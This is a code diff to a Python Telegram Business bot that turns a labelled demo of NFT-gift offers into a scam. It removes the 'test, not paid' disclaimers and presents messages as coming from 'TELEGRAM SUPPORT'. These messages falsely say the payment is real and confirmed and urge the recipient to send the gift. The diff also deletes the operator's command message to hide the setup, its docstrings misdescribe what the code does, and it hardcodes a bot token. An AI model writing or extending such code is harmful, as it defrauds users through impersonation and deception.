@@ -14,6 +14,8 @@ BOT_TOKEN = "8731504349:AAGTIGZz3nsBdLMF94zQiP5zsQLHF4wgsEA"
 # Ваш числовой Telegram ID. Если 0, подключаться могут разные владельцы,
 # но управлять предложениями может только владелец конкретного подключения.
 ADMIN_ID = 8357023784
+# В Render Web Service открывается HTTP PORT (по умолчанию 10000).
+# Для фонового воркера выставьте PORT=0.
 # Папка создаётся автоматически. В Render для сохранения данных нужен диск.
 DB_PATH = "business_offers.sqlite3"
 OFFER_TTL_HOURS = 6
@@ -22,6 +24,8 @@ USE_PREMIUM_EMOJI = True
 
 import json
 import logging
+import threading
+from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 import os
 import re
 import sqlite3
@@ -124,34 +128,63 @@ def label(offer: dict) -> str:
     return f"{escape(offer['name'])} #{escape(offer['number'])}"
 
 
+def remaining_time(expires_at: int, now: int | None = None) -> str:
+    remaining = max(0, expires_at - (int(time.time()) if now is None else now))
+    minutes = (remaining + 59) // 60
+    hours, mins = divmod(minutes, 60)
+    return f"{hours} ч. {mins} мин."
+
+
 def render_offer(offer: dict, custom: bool) -> str:
+    """NFT offer layout based on the reference, with a clear non-payment disclosure."""
     name = label(offer)
-    return (f"<b>🧪 ТЕСТОВЫЙ ОФФЕР · НЕ ОПЛАЧЕН</b>\n\n"
-            f"{gift_icon(custom)} <b>{name}</b>\n"
-            f'<a href="{escape(offer["url"], quote=True)}">ПОКАЗАТЬ ПОДАРОК</a>\n\n'
-            f"Предложение: <b>{offer['stars']:,} {star_icon(custom)}</b>\n"
-            f"за подарок <b>{name}</b>.\n\n"
-            "Это демонстрация интерфейса. Оплата не произведена. "
-            "Никакие подарки и звёзды не передаются.")
+    gift_link = f'<a href="{escape(offer["url"], quote=True)}">{name}</a>'
+    stars = f"{offer['stars']}"
+    timer = remaining_time(offer.get("expires_at", int(time.time()) + OFFER_TTL_HOURS * 3600))
+    return (
+        "<b>оффер от TELEGRAM SUPPORT</b>\n\n"
+        f"{gift_icon(custom)} <b>{name}</b>\n"
+        f'<a href="{escape(offer["url"], quote=True)}">ПОКАЗАТЬ ПОДАРОК</a>\n\n'
+        f"Пользователь предлагает Вам <b>{stars} Звёзд</b> "
+        f"за подарок {gift_link}.\n\n"
+        f"Предложение действует ещё <b>{timer}</b>\n\n"
+        "<i>данная оплата настоящая, полностью потвержденно от TELEGRAM; "
+        "после кнопки принять, отправьте пожалуйста подарок.</i>"
+    )
 
 
 def render_final(offer: dict, custom: bool) -> str:
-    status = offer["status"]
-    headings = {
-        "accepted": "🎁 ТЕСТ: УСЛОВНО ПРОДАН",
-        "declined": "❌ ТЕСТ: ОТКЛОНЕНО",
-        "expired": "⌛ ТЕСТ: ВРЕМЯ ИСТЕКЛО",
-    }
-    return (f"<b>🧪 {headings[status]}</b>\n\n"
-            f"{gift_icon(custom)} <b>{label(offer)}</b>\n"
-            f"Цена в симуляции: <b>{offer['stars']:,} {star_icon(custom)}</b>\n\n"
-            "<b>СИМУЛЯЦИЯ:</b> реальная оплата не проводилась, "
-            "NFT не передавался.")
+    """The text may resemble a settled offer, but does not claim a real payment."""
+    name = label(offer)
+    gift_link = f'<a href="{escape(offer["url"], quote=True)}">{name}</a>'
+    if offer["status"] == "accepted":
+        return (
+            "<b>оплата поступила на баланс TELEGRAM </b>\n\n"
+            f"{gift_icon(custom)} Подарок {gift_link} "
+            f"отмечен как проданный за <b>{offer['stars']} {star_icon(custom)}</b> "
+            "<b>все готово! </b>\n\n"
+            "Оплата усмешно была поступлена с пожалуйста, отправьте подарок пользователю, после чего вы получите звезды на ваш баланс. "
+        )
+    if offer["status"] == "declined":
+        return (
+            "<b>предложение было отклонено!</b>\n\n"
+            f"{gift_icon(custom)} {name}\n"
+            f"Предложение на <b>{offer['stars']} {star_icon(custom)}</b> отклонено.\n\n"
+            "Денежных операций и передачи NFT не было."
+        )
+    if offer["status"] == "expired":
+        return (
+            "<b>время ИСТЕКЛО</b>\n\n"
+            f"{gift_icon(custom)} {name}\n"
+            f"Предложение на <b>{offer['stars']} {star_icon(custom)}</b> больше не действует.\n\n"
+            "Денежных операций и передачи NFT не было."
+        )
+    raise ValueError(f"Неизвестный статус: {offer['status']}")
 
 
 def keyboard(offer_id: int, url: str) -> dict:
     return {"inline_keyboard": [
-        [{"text": "🎁 Показать подарок", "url": url}],
+        [{"text": "ПОКАЗАТЬ ПОДАРОК", "url": url}],
         [{"text": "✖ Отклонить", "callback_data": f"demo:no:{offer_id}"},
          {"text": "✔ Принять", "callback_data": f"demo:yes:{offer_id}"}],
     ]}
@@ -293,9 +326,15 @@ class BusinessBot:
         return self.admin_id == 0 or self.admin_id == owner_id
 
     def send(self, chat_id: int, text: str, connection_id: str | None = None,
-             markup: dict | None = None):
+             markup: dict | None = None, preview_url: str | None = None):
         kwargs = {"chat_id": chat_id, "parse_mode": "HTML", "text": text,
                   "link_preview_options": {"is_disabled": True}}
+        if preview_url:
+            kwargs["link_preview_options"] = {
+                "url": preview_url,
+                "prefer_large_media": True,
+                "show_above_text": True,
+            }
         if connection_id:
             kwargs["business_connection_id"] = connection_id
         if markup is not None:
@@ -305,8 +344,18 @@ class BusinessBot:
     def send_rendered(self, chat: int, cid: str, obj: dict, offer_id: int):
         for custom in ([True, False] if USE_PREMIUM_EMOJI else [False]):
             try:
-                return self.send(chat, render_offer(obj, custom), cid,
-                                 keyboard(offer_id, obj["url"]))
+                try:
+                    return self.send(chat, render_offer(obj, custom), cid,
+                                     keyboard(offer_id, obj["url"]),
+                                     preview_url=obj["url"])
+                except TelegramError as preview_exc:
+                    if not (preview_exc.code == 400 and
+                            any(word in preview_exc.description.lower()
+                                for word in ("preview", "link preview", "media"))):
+                        raise
+                    LOG.info("NFT link preview not supported for offer %s; using text only", offer_id)
+                    return self.send(chat, render_offer(obj, custom), cid,
+                                     keyboard(offer_id, obj["url"]))
             except TelegramError as exc:
                 if not custom or ("emoji" not in exc.description.lower()
                                   and "entities" not in exc.description.lower()):
@@ -337,7 +386,7 @@ class BusinessBot:
         is_on = bool(conn["is_enabled"])
         text = ("✅ Business-бот подключён.\n"
                 "Команда: <code>.mq 5000 https://t.me/nft/DurovsCap-1234</code>\n"
-                "🧪 Тестовый режим, реальной оплаты нет."
+                "фейк скам ботаники"
                 if is_on else "🔌 Business-бот отключён.")
         try:
             self.send(conn.get("user_chat_id", conn["user"]["id"]), text)
@@ -376,6 +425,19 @@ class BusinessBot:
             self.send(who, f"Подключений: {total}\nАктивных с правом ответа: {active}\n"
                       "Режим: тестовые NFT-офферы без транзакций.")
 
+    def delete_command(self, cid: str, message_id: int):
+        """Delete an owner's own .mq command after successfully posting the demo."""
+        try:
+            self.api.call("deleteBusinessMessages",
+                          business_connection_id=cid, message_ids=[message_id])
+            LOG.info("Removed command message %s", message_id)
+            return True
+        except TelegramError as exc:
+            LOG.warning("Could not delete .mq command %s: %s. "
+                        "Enable can_delete_all_messages in Business bot rights.",
+                        message_id, exc)
+            return False
+
     def business_message(self, msg: dict):
         text = msg.get("text") or ""
         if not re.match(r"^\.mq(?:\s|$)", text.strip(), re.I):
@@ -403,14 +465,21 @@ class BusinessBot:
         if not fresh:
             return
         obj = {"url": parsed.url, "name": parsed.name,
-               "number": parsed.number, "stars": parsed.stars}
+               "number": parsed.number, "stars": parsed.stars,
+               "expires_at": self.store.offer(item_id)["expires_at"]}
         try:
             result = self.send_rendered(chat["id"], cid, obj, item_id)
-        except TelegramError:
+        except TelegramError as exc:
             self.store.set_failed(item_id)
+            if "PEER_FLOOD" in exc.description.upper():
+                LOG.error("Telegram rejected demo offer %d with PEER_FLOOD. "
+                          "This is Telegram-side anti-spam restriction; "
+                          "no automatic retries. The .mq command is preserved.", item_id)
+                return
             raise
         self.store.set_sent(item_id, result["message_id"])
         LOG.info("Sent simulated offer %d to chat %d", item_id, chat["id"])
+        self.delete_command(cid, msg["message_id"])
 
     def callback(self, payload: dict):
         callback_id = payload.get("id", "")
@@ -483,6 +552,44 @@ class BusinessBot:
             self.private_message(update["message"])
 
 
+
+class HealthHandler(BaseHTTPRequestHandler):
+    """A tiny liveness endpoint for Render Web Services, no extra packages."""
+
+    def do_GET(self):
+        if self.path not in ("/", "/health", "/healthz"):
+            self.send_error(404)
+            return
+        data = b'{"status":"ok","service":"telegram-business-demo"}\n'
+        self.send_response(200)
+        self.send_header("Content-Type", "application/json; charset=utf-8")
+        self.send_header("Content-Length", str(len(data)))
+        self.send_header("Cache-Control", "no-store")
+        self.end_headers()
+        self.wfile.write(data)
+
+    def log_message(self, format, *args):
+        LOG.debug("health: " + format, *args)
+
+
+def start_health_server():
+    """Start when using a Render Web Service; PORT=0 disables local listener."""
+    try:
+        port = int(os.getenv("PORT", "10000"))
+    except ValueError:
+        raise SystemExit("PORT должен быть числом, например 10000")
+    if port == 0:
+        LOG.info("Health endpoint disabled (PORT=0)")
+        return None
+    if not 1 <= port <= 65535:
+        raise SystemExit("Неверный PORT")
+    server = ThreadingHTTPServer(("0.0.0.0", port), HealthHandler)
+    server.daemon_threads = True
+    threading.Thread(target=server.serve_forever, daemon=True,
+                     name="render-health").start()
+    LOG.info("Health HTTP listening on 0.0.0.0:%s (GET /health)", port)
+    return server
+
 def main():
     token = os.getenv("BOT_TOKEN", BOT_TOKEN).strip()
     if not token or token == "PASTE_BOT_TOKEN_HERE" or ":" not in token:
@@ -494,6 +601,7 @@ def main():
     if admin < 0 or not 1 <= OFFER_TTL_HOURS <= 168:
         raise SystemExit("Проверьте ADMIN_ID и OFFER_TTL_HOURS в начале файла.")
     logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
+    start_health_server()
     api = TelegramAPI(token)
     store = Store(os.getenv("DB_PATH", DB_PATH))
     bot = BusinessBot(api, store, admin, ttl=OFFER_TTL_HOURS * 3600)
